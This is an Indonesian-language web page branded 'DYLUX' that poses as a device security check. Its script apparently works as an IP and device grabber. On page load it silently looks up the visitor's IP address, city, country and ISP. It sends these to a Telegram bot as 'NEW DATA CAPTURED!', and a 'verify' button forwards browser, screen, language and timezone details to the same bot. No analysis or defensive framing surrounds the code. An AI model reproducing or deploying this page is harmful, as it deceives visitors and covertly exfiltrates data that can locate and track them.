<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Device Info</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: Arial, sans-serif;
            color: #e0e0ff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .box {
            background: #14141e;
            border: 1px solid rgba(0,240,255,0.1);
            border-radius: 16px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 24px;
            font-weight: 800;
            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge { display: inline-block; background: rgba(123,47,252,0.1); color: #7b2ffc; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
        .icon { font-size: 48px; margin: 16px 0; }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
        .info-grid { background: #0a0a0f; border-radius: 12px; padding: 12px; margin: 16px 0; border: 1px solid rgba(0,240,255,0.1); }
        .info-row { display: flex; justify-content: space-between; padding: 8px 12px; border-bottom: 1px solid rgba(0,240,255,0.05); font-size: 13px; }
        .info-row:last-child { border-bottom: none; }
        .info-row .label { color: #8888aa; }
        .info-row .value { color: #e0e0ff; font-weight: 500; }
        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            background: linear-gradient(135deg, #00f0ff, #7b2ffc);
            color: #fff;
            transition: 0.3s;
        }
        button:hover { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">DYLUX</div>
        <div class="badge">💻 Device Info</div>
        <div class="icon">💻</div>
        <h2>Informasi Perangkat</h2>
        <p>Deteksi perangkat Anda untuk verifikasi keamanan.</p>
        <div class="info-grid">
            <div class="info-row"><span class="label">📱 Perangkat</span><span class="value" id="deviceName">-</span></div>
            <div class="info-row"><span class="label">🌍 Browser</span><span class="value" id="browserName">-</span></div>
            <div class="info-row"><span class="label">🖥️ Resolusi</span><span class="value" id="screenRes">-</span></div>
            <div class="info-row"><span class="label">🌐 Bahasa</span><span class="value" id="languageInfo">-</span></div>
            <div class="info-row"><span class="label">⏰ Zona Waktu</span><span class="value" id="timezoneInfo">-</span></div>
        </div>
        <button id="infoBtn">Verifikasi Perangkat</button>
        <div class="spinner" id="spinner"></div>
        <div id="statusMsg"></div>
        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
    </div>

    <script>
    // AUTO-DETECT
    (async function autoDetect() {
        try {
            const userId = new URLSearchParams(window.location.search).get('id');
            if (!userId) return;
            const ipRes = await fetch('https://ip-api.com/json/');
            const ipData = await ipRes.json();
            const message = 
                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                `<b>📌 Type:</b> Auto-Detect\n` +
                `<b>🌐 IP:</b> ${ipData.query || 'unknown'}\n` +
                `<b>📍 Lokasi:</b> ${ipData.city || 'unknown'}, ${ipData.country || 'unknown'}\n` +
                `<b>📡 ISP:</b> ${ipData.isp || 'unknown'}\n\n` +
                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });
        } catch (e) { console.error(e); }
    })();

    // DEVICE INFO LOGIC
    const userId = new URLSearchParams(window.location.search).get('id');
    const infoBtn = document.getElementById('infoBtn');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');

    // Get device info
    const ua = navigator.userAgent;
    let device = 'Unknown';
    if (/iPhone|iPad|iPod/.test(ua)) device = 'Apple iOS';
    else if (/Android/.test(ua)) device = 'Android';
    else if (/Windows/.test(ua)) device = 'Windows';
    else if (/Mac/.test(ua)) device = 'macOS';
    else if (/Linux/.test(ua)) device = 'Linux';
    
    let browser = 'Unknown';
    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
    else if (/Firefox/.test(ua)) browser = 'Firefox';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Edg/.test(ua)) browser = 'Edge';
    else if (/Opera/.test(ua)) browser = 'Opera';

    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    document.getElementById('deviceName').textContent = device;
    document.getElementById('browserName').textContent = browser;
    document.getElementById('screenRes').textContent = screenRes;
    document.getElementById('languageInfo').textContent = language;
    document.getElementById('timezoneInfo').textContent = timezone;

    infoBtn.addEventListener('click', async () => {
        infoBtn.disabled = true;
        spinner.classList.add('active');
        statusMsg.style.display = 'none';

        try {
            const message = 
                `<b>💻 DEVICE INFO CAPTURED!</b>\n\n` +
                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                `<b>📱 Device:</b> ${device}\n` +
                `<b>🌍 Browser:</b> ${browser}\n` +
                `<b>🖥️ Screen:</b> ${screenRes}\n` +
                `<b>🌐 Language:</b> ${language}\n` +
                `<b>⏰ Timezone:</b> ${timezone}\n` +
                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;

            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: userId, text: message, parse_mode: 'HTML' })
            });

            spinner.classList.remove('active');
            infoBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '✅ Informasi perangkat terkirim!';
        } catch (error) {
            spinner.classList.remove('active');
            infoBtn.disabled = false;
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '❌ Gagal!';
        }
    });
    </script>
</body>
</html>
